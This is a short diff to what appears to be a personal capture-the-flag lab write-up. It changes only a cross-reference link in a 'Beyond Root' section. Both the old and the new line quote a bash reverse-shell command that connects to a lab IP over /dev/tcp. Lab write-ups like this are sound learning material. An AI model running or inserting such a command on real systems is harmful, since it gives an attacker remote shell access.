@@ -146,7 +146,7 @@ I did not use noting for this box. I just tried changing up to more improvised m
 
 ## Beyond Root
 
-Understanding `make` - why does `system("/bin/bash -i >& /dev/tcp/192.168.45.225/6379 0>&1",NULL,NULL);` not work. Twinned with [[XposedAPI-Writeup]]
+Understanding `make` - why does `system("/bin/bash -i >& /dev/tcp/192.168.45.225/6379 0>&1",NULL,NULL);` not work. Twinned with [[Sybaris-Helped-Through]]
 ```
 make -C ./src
 ```
